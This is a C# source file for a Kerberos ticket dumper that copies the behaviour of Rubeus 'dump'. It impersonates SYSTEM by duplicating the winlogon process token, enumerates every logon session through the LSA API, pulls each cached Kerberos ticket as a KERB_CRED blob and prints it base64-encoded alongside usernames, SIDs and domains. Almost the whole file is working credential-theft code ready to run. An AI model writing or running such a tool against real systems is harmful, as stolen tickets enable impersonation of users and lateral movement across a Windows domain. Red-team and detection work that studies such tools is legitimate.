using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

// Kerberos ticket dumper that performs the same behavoir as `Rubeus.exe dump`
// Based on Rubeus code: https://github.com/GhostPack/Rubeus/blob/master/Rubeus/lib/LSA.cs
// Also based on PowerShellKerberos dumper.ps1: https://github.com/MzHmO/PowershellKerberos/blob/main/dumper.ps1
// Thx to Skyler Knecht and ChatGPT for doing most of the work


namespace TicketExtract
{
    public class Program
    {

        // LsaLookupAuthenticationPackage
        [StructLayout(LayoutKind.Sequential)]
        public struct LSA_STRING_IN
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public string Buffer;
        }

        [DllImport("secur32.dll", SetLastError = false)]
        public static extern int LsaLookupAuthenticationPackage(
            [In] IntPtr LsaHandle,
            [In] ref LSA_STRING_IN PackageName,
            [Out] out int AuthenticationPackage
        );

        // LsaConnectUntrusted

        [DllImport("secur32.dll", SetLastError = false)]
        public static extern int LsaConnectUntrusted(
            [Out] out IntPtr LsaHandle
        );

        // RevertToSelf

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool RevertToSelf();

        public static void Main(string[] args)
        {
            try
            {
                // Elevate to NT AUTHORITY\SYSTEM
                if (!Elevate())
                {
                    return;
                }

                // Get handle to LSA
                IntPtr lsaHandle = IntPtr.Zero;
                if (LsaConnectUntrusted(out lsaHandle) != 0)
                {
                    Console.WriteLine("[!] LsaConnectUntrusted failed");
                    RevertToSelf();
                    return;
                }

                // Get unique identifier for Kerberos authentication package

                int kerberosAuthenticationPackageIdentifier;
                string name = "kerberos";
                LSA_STRING_IN LSAString;
                LSAString.Length = (ushort)name.Length;
                LSAString.MaximumLength = (ushort)(name.Length + 1);
                LSAString.Buffer = name;

                if (LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out kerberosAuthenticationPackageIdentifier) != 0)
                {
                    Console.WriteLine("[!] LsaLookupAuthenticationPackage failed");
                    RevertToSelf();
                    return;
                }

                // Grab tickets for each Logon Session
                if (GetTickets(lsaHandle, kerberosAuthenticationPackageIdentifier))
                {
                    // Maybe error here?
                    return;
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Unhandled exception:");
                Console.WriteLine(ex.ToString());
                RevertToSelf();
                return;
            }
        }

        public static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        // Elevate 
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            UInt32 DesiredAccess,
            out IntPtr TokenHandle
        );

        [DllImport("advapi32.dll")]
        public static extern bool DuplicateToken(
            IntPtr ExistingTokenHandle,
            int SECURITY_IMPERSONATION_LEVEL,
            ref IntPtr DuplicateTokenHandle
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(
            IntPtr hToken
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(
            IntPtr hObject
        );

        public static bool Elevate()
        {
            // Check if we are already SYSTEM first
            var currentSid = WindowsIdentity.GetCurrent().User;
            if (currentSid.IsWellKnown(WellKnownSidType.LocalSystemSid))
            {
                return true;
            }

            Process[] processes = Process.GetProcessesByName("winlogon");
            IntPtr handle = processes[0].Handle;

            IntPtr hToken = IntPtr.Zero;
            bool errno = OpenProcessToken(handle, 0x0002, out hToken);
            if (!errno)
            {
                Console.WriteLine("[!] OpenProcessToken failed");
                return false;
            }

            IntPtr hDupToken = IntPtr.Zero;
            errno = DuplicateToken(hToken, 2, ref hDupToken);
            if (!errno)
            {
                Console.WriteLine("[!] DuplicateToken failed");
                return false;
            }

            errno = ImpersonateLoggedOnUser(hDupToken);
            if (!errno)
            {
                Console.WriteLine("[!] ImpersonateLoggedOnUser failed");
                return false;
            }

            // clean up the handles we created
            CloseHandle(hToken);
            CloseHandle(hDupToken);

            currentSid = WindowsIdentity.GetCurrent().User;
            if (!currentSid.IsWellKnown(WellKnownSidType.LocalSystemSid))
            {
                return false;
            }

            return true;
        }

        // GetLogonSessionLUIDs
        [DllImport("secur32.dll")]
        public static extern int LsaEnumerateLogonSessions(out int logonSessionCount, out IntPtr logonSessionList);

        [DllImport("secur32.dll")]
        public static extern int LsaGetLogonSessionData(IntPtr logonSessionData, out IntPtr ppLogonSessionData);

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LSA_STRING
        {
            public ushort Length; // Length of the string
            public ushort MaximumLength; // Maximum length of the string
            public IntPtr Buffer; // Pointer to the string buffer
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_LOGON_SESSION_DATA
        {
            public uint Size;
            public LUID LogonId;
            public LSA_STRING_OUT UserName;
            public LSA_STRING_OUT LogonDomain;
            public LSA_STRING_OUT AuthenticationPackage;
            public uint LogonType;
            public uint Session;
            public IntPtr Sid;
            public long LogonTime;
            public LSA_STRING_OUT LogonServer;
            public LSA_STRING_OUT DnsDomainName;
            public LSA_STRING_OUT Upn;
        }

        [DllImport("secur32.dll")]
        public static extern int LsaFreeReturnBuffer(IntPtr buffer);

        private static List<LogonSessionData> GetLogonSessions()
        {
            List<LogonSessionData> sessionDataList = new List<LogonSessionData>();

            int logonSessionCount;
            IntPtr logonSessionList;

            // Enumerate logon sessions
            int result = LsaEnumerateLogonSessions(out logonSessionCount, out logonSessionList);
            if (result != 0)
            {
                throw new Exception("Error enumerating logon sessions: " + result);
            }

            IntPtr currentLogonSession = logonSessionList;

            for (int i = 0; i < logonSessionCount; i++)
            {
                SECURITY_LOGON_SESSION_DATA sessionDataUnsafe;

                result = LsaGetLogonSessionData(currentLogonSession, out IntPtr pSessionData);
                if (result != 0)
                {
                    throw new Exception("Error getting logon session data: " + result);
                }

                sessionDataUnsafe = Marshal.PtrToStructure<SECURITY_LOGON_SESSION_DATA>(pSessionData);
                LogonSessionData logonSessionData = new LogonSessionData()
                {
                    AuthenticationPackage = Marshal.PtrToStringUni(sessionDataUnsafe.AuthenticationPackage.Buffer, sessionDataUnsafe.AuthenticationPackage.Length / 2),
                    DnsDomainName = Marshal.PtrToStringUni(sessionDataUnsafe.DnsDomainName.Buffer, sessionDataUnsafe.DnsDomainName.Length / 2),
                    LogonDomain = Marshal.PtrToStringUni(sessionDataUnsafe.LogonDomain.Buffer, sessionDataUnsafe.LogonDomain.Length / 2),
                    LogonID = sessionDataUnsafe.LogonId,
                    LogonTime = DateTime.FromFileTime((long)sessionDataUnsafe.LogonTime),
                    //LogonTime = systime.AddTicks((long)unsafeData.LoginTime),
                    LogonServer = Marshal.PtrToStringUni(sessionDataUnsafe.LogonServer.Buffer, sessionDataUnsafe.LogonServer.Length / 2),
                    LogonType = (int)sessionDataUnsafe.LogonType,
                    Sid = (sessionDataUnsafe.Sid == IntPtr.Zero ? null : new SecurityIdentifier(sessionDataUnsafe.Sid)),
                    Upn = Marshal.PtrToStringUni(sessionDataUnsafe.Upn.Buffer, sessionDataUnsafe.Upn.Length / 2),
                    Session = (int)sessionDataUnsafe.Session,
                    Username = Marshal.PtrToStringUni(sessionDataUnsafe.UserName.Buffer, sessionDataUnsafe.UserName.Length / 2),
                };
                sessionDataList.Add(logonSessionData);

                // Free the memory allocated for session data
                LsaFreeReturnBuffer(pSessionData);

                currentLogonSession = (IntPtr)((long)currentLogonSession + Marshal.SizeOf(typeof(LUID)));
            }

            // Free the memory allocated for the logon session list
            LsaFreeReturnBuffer(logonSessionList);

            return sessionDataList;
        }

        // GetTickets
        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_QUERY_TKT_CACHE_REQUEST
        {
            public int MessageType;
            public LUID LogonId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_QUERY_TKT_CACHE_RESPONSE
        {
            public int MessageType;
            public int NumberOfTickets;
            public IntPtr Tickets;
        }

        [DllImport("secur32.dll", SetLastError = false)]
        public static extern int LsaCallAuthenticationPackage(
            IntPtr LsaHandle,
            int AuthenticationPackage,
            IntPtr ProtocolSubmitBuffer,
            int SubmitBufferLength,
            out IntPtr ProtocolReturnBuffer,
            out int ReturnBufferLength,
            out int ProtocolStatus
        );

        [StructLayout(LayoutKind.Sequential)]
        public struct LSA_STRING_OUT
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_TICKET_CACHE_INFO_EX
        {
            public LSA_STRING_OUT ClientName;
            public LSA_STRING_OUT ClientRealm;
            public LSA_STRING_OUT ServerName;
            public LSA_STRING_OUT ServerRealm;
            public Int64 StartTime;
            public Int64 EndTime;
            public Int64 RenewTime;
            public Int32 EncryptionType;
            public UInt32 TicketFlags;
        }

        [Flags]
        public enum TicketFlags : UInt32
        {
            reserved = 2147483648,
            forwardable = 0x40000000,
            forwarded = 0x20000000,
            proxiable = 0x10000000,
            proxy = 0x08000000,
            may_postdate = 0x04000000,
            postdated = 0x02000000,
            invalid = 0x01000000,
            renewable = 0x00800000,
            initial = 0x00400000,
            pre_authent = 0x00200000,
            hw_authent = 0x00100000,
            ok_as_delegate = 0x00040000,
            anonymous = 0x00020000,
            name_canonicalize = 0x00010000,
            //cname_in_pa_data = 0x00040000,
            enc_pa_rep = 0x00010000,
            reserved1 = 0x00000001,
            empty = 0x00000000
            // TODO: constrained delegation?
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_EXTERNAL_TICKET
        {
            public IntPtr ServiceName;
            public IntPtr TargetName;
            public IntPtr ClientName;
            public LSA_STRING_OUT DomainName;
            public LSA_STRING_OUT TargetDomainName;
            public LSA_STRING_OUT AltTargetDomainName;
            public KERB_CRYPTO_KEY SessionKey;
            public UInt32 TicketFlags;
            public UInt32 Flags;
            public Int64 KeyExpirationTime;
            public Int64 StartTime;
            public Int64 EndTime;
            public Int64 RenewUntil;
            public Int64 TimeSkew;
            public Int32 EncodedTicketSize;
            public IntPtr EncodedTicket;
        }

        public class LogonSessionData
        {
            public LUID LogonID;
            public string Username;
            public string LogonDomain;
            public string AuthenticationPackage;
            public int LogonType;
            public int Session;
            public SecurityIdentifier Sid;
            public DateTime LogonTime;
            public string LogonServer;
            public string DnsDomainName;
            public string Upn;
        }

        public class KRB_TICKET
        {
            // contains cache info (i.e. KERB_TICKET_CACHE_INFO_EX) and the full .kirbi
            public string ClientName;
            public string ClientRealm;
            public string ServerName;
            public string ServerRealm;
            public DateTime StartTime;
            public DateTime EndTime;
            public DateTime RenewTime;
            public Int32 EncryptionType;
            public TicketFlags TicketFlags;
            public byte[] TicketData;
        }

        private static bool GetTickets(IntPtr lsaHandle, int kerberosAuthenticationPackageIdentifier)
        {
            foreach (LogonSessionData logonSession in GetLogonSessions())
            {

                // Make Request to LSA

                KERB_QUERY_TKT_CACHE_REQUEST kerbQueryTKTCacheRequest = new KERB_QUERY_TKT_CACHE_REQUEST();

                kerbQueryTKTCacheRequest.MessageType = 14; // 14 is KerbQueryTicketCacheExMessage
                kerbQueryTKTCacheRequest.LogonId = logonSession.LogonID;

                var kerbQueryTKTCacheRequestPtr = Marshal.AllocHGlobal(Marshal.SizeOf(kerbQueryTKTCacheRequest));
                Marshal.StructureToPtr(kerbQueryTKTCacheRequest, kerbQueryTKTCacheRequestPtr, false);

                var ticketsPointer = IntPtr.Zero;
                var returnBufferLength = 0;
                var protocalStatus = 0;

                if (LsaCallAuthenticationPackage(
                    lsaHandle,
                    kerberosAuthenticationPackageIdentifier,
                    kerbQueryTKTCacheRequestPtr, Marshal.SizeOf(kerbQueryTKTCacheRequest),
                    out ticketsPointer,
                    out returnBufferLength,
                    out protocalStatus) != 0)
                {
                    Console.WriteLine("[!] LsaCallAuthenticationPackage failed");
                    return false;
                }

                // Parse Response from LSA

                KERB_QUERY_TKT_CACHE_RESPONSE kerbQueryTKTCacheResponse = new KERB_QUERY_TKT_CACHE_RESPONSE();

                if (ticketsPointer == IntPtr.Zero)
                {
                    Console.WriteLine($"[*] Failed to obtain ticketsPointer for {logonSession.LogonID.LowPart}");
                    continue;
                }

                kerbQueryTKTCacheResponse = (KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure(ticketsPointer, typeof(KERB_QUERY_TKT_CACHE_RESPONSE));
                int numberOfTickets = kerbQueryTKTCacheResponse.NumberOfTickets;

                if (numberOfTickets == 0)
                {
                    Console.WriteLine($"[*] No tickets for {logonSession.LogonID.LowPart}");
                    continue;
                }

                var dataSize = Marshal.SizeOf(typeof(KERB_TICKET_CACHE_INFO_EX));

                for (int i = 0; i < numberOfTickets; i++)
                {
                    IntPtr ticketPtr = (IntPtr)(ticketsPointer.ToInt64() + (8 + i * dataSize)); // Thanks SpectreOps for doing this math <3

                    KERB_TICKET_CACHE_INFO_EX ticketCacheResult = (KERB_TICKET_CACHE_INFO_EX)Marshal.PtrToStructure(ticketPtr, typeof(KERB_TICKET_CACHE_INFO_EX));

                    KRB_TICKET ticket = new KRB_TICKET();
                    ticket.StartTime = DateTime.FromFileTime(ticketCacheResult.StartTime);
                    ticket.EndTime = DateTime.FromFileTime(ticketCacheResult.EndTime);
                    ticket.RenewTime = DateTime.FromFileTime(ticketCacheResult.RenewTime);
                    ticket.TicketFlags = (TicketFlags)ticketCacheResult.TicketFlags;
                    ticket.EncryptionType = ticketCacheResult.EncryptionType;
                    ticket.ServerName = Marshal.PtrToStringUni(ticketCacheResult.ServerName.Buffer, ticketCacheResult.ServerName.Length / 2);
                    ticket.ServerRealm = Marshal.PtrToStringUni(ticketCacheResult.ServerRealm.Buffer, ticketCacheResult.ServerRealm.Length / 2);
                    ticket.ClientName = Marshal.PtrToStringUni(ticketCacheResult.ClientName.Buffer, ticketCacheResult.ClientName.Length / 2);
                    ticket.ClientRealm = Marshal.PtrToStringUni(ticketCacheResult.ClientRealm.Buffer, ticketCacheResult.ClientRealm.Length / 2);
                    ticket.TicketData = ExtractTickets(lsaHandle, kerberosAuthenticationPackageIdentifier, kerbQueryTKTCacheRequest.LogonId, ticket.ServerName);

                    Console.WriteLine("Username        : " + logonSession.Username);
                    Console.WriteLine("UPN             : " + logonSession.Upn);
                    Console.WriteLine("SID             : " + logonSession.Sid);
                    Console.WriteLine("Session         : " + logonSession.Session);
                    Console.WriteLine("Logon Server    : " + logonSession.LogonServer);
                    Console.WriteLine("Logon Domain    : " + logonSession.LogonDomain);
                    Console.WriteLine("Logon Time      : " + logonSession.LogonTime);
                    Console.WriteLine("Logon Type      : " + logonSession.LogonType);
                    Console.WriteLine("Auth Package    : " + logonSession.AuthenticationPackage);
                    Console.WriteLine("----------------:");
                    Console.WriteLine("Start Time      : " + ticket.StartTime);
                    Console.WriteLine("End Time        : " + ticket.EndTime);
                    Console.WriteLine("Renew Time      : " + ticket.RenewTime);
                    Console.WriteLine("Ticket Flags    : " + ticket.TicketFlags);
                    Console.WriteLine("Encryption Type : " + ticket.EncryptionType);
                    Console.WriteLine("Server Name     : " + ticket.ServerName);
                    Console.WriteLine("Server Realm    : " + ticket.ServerRealm);
                    Console.WriteLine("Client Name     : " + ticket.ClientRealm);
                    Console.WriteLine("Ticket Data     : " + Convert.ToBase64String(ticket.TicketData));
                    Console.WriteLine("================================================================");
                }
            }
            return true;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_HANDLE
        {
            public IntPtr LowPart;
            public IntPtr HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_RETRIEVE_TKT_REQUEST
        {
            public int MessageType;
            public LUID LogonId;
            public UNICODE_STRING TargetName;
            public uint TicketFlags;
            public uint CacheOptions;
            public int EncryptionType;
            public SECURITY_HANDLE CredentialsHandle;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_CRYPTO_KEY
        {
            public int KeyType;
            public int Length;
            public IntPtr Value;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_RETRIEVE_TKT_RESPONSE
        {
            public KERB_EXTERNAL_TICKET Ticket;
        }

        [DllImport("kernel32.dll", EntryPoint = "CopyMemory", SetLastError = false)]
        public static extern void CopyMemory(
            IntPtr dest,
            IntPtr src,
            uint count
        );

        public static byte[] ExtractTickets(IntPtr lsaHandle, int kerberosAuthenticationPackageIdentifier, LUID LogonId, string serverName)
        {
            var request = new KERB_RETRIEVE_TKT_REQUEST();
            KERB_RETRIEVE_TKT_RESPONSE response = new KERB_RETRIEVE_TKT_RESPONSE();
            var responsePointer = IntPtr.Zero;
            var returnBufferLength = 0;
            var protocolStatus = 0;

            // Initialize request
            request.MessageType = 0x8;
            request.LogonId = LogonId;
            request.TicketFlags = 0x0; // Use default ticket flags
            request.CacheOptions = 0x8; // Use KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED
            request.EncryptionType = 0x0; // Use default encryption type

            // Set target name
            var targetName = new UNICODE_STRING(serverName);
            request.TargetName = targetName;

            // Allocate memory for the request
            int structSize = Marshal.SizeOf(typeof(KERB_RETRIEVE_TKT_REQUEST)) + targetName.MaximumLength;
            var requestPtr = Marshal.AllocHGlobal(structSize);
            Marshal.StructureToPtr(request, requestPtr, false);

            // Update target name buffer pointer
            IntPtr targetNameBufferPtr = (IntPtr)((long)requestPtr + Marshal.SizeOf(request));
            CopyMemory(targetNameBufferPtr, targetName.buffer, targetName.MaximumLength);
            Marshal.WriteIntPtr(requestPtr, IntPtr.Size == 8 ? 24 : 16, targetNameBufferPtr);

            // Call LsaCallAuthenticationPackage
            int resultCode = LsaCallAuthenticationPackage(lsaHandle, kerberosAuthenticationPackageIdentifier, requestPtr, structSize, out responsePointer, out returnBufferLength, out protocolStatus);

            // Handle response
            if (resultCode == 0 && responsePointer != IntPtr.Zero && returnBufferLength != 0)
            {
                response = (KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(responsePointer, typeof(KERB_RETRIEVE_TKT_RESPONSE));
                int encodedTicketSize = response.Ticket.EncodedTicketSize;
                byte[] encodedTicket = new byte[encodedTicketSize];
                Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);

                // Console.WriteLine($"Successfully extracted ticket for {serverName}");
                // Console.WriteLine(Convert.ToBase64String(encodedTicket)); // console writeline the encodedTicket 
                // Remember to free any allocated resources
                LsaFreeReturnBuffer(responsePointer);
                Marshal.FreeHGlobal(requestPtr);

                return encodedTicket;
            }
            else
            {
                Console.WriteLine($"Failed to extract ticket for {serverName}. ResultCode: {resultCode}, ProtocolStatus: {protocolStatus}");

                // Clean up on failure
                if (responsePointer != IntPtr.Zero) LsaFreeReturnBuffer(responsePointer);
                Marshal.FreeHGlobal(requestPtr);

                return null;
            }
        }
    }
}
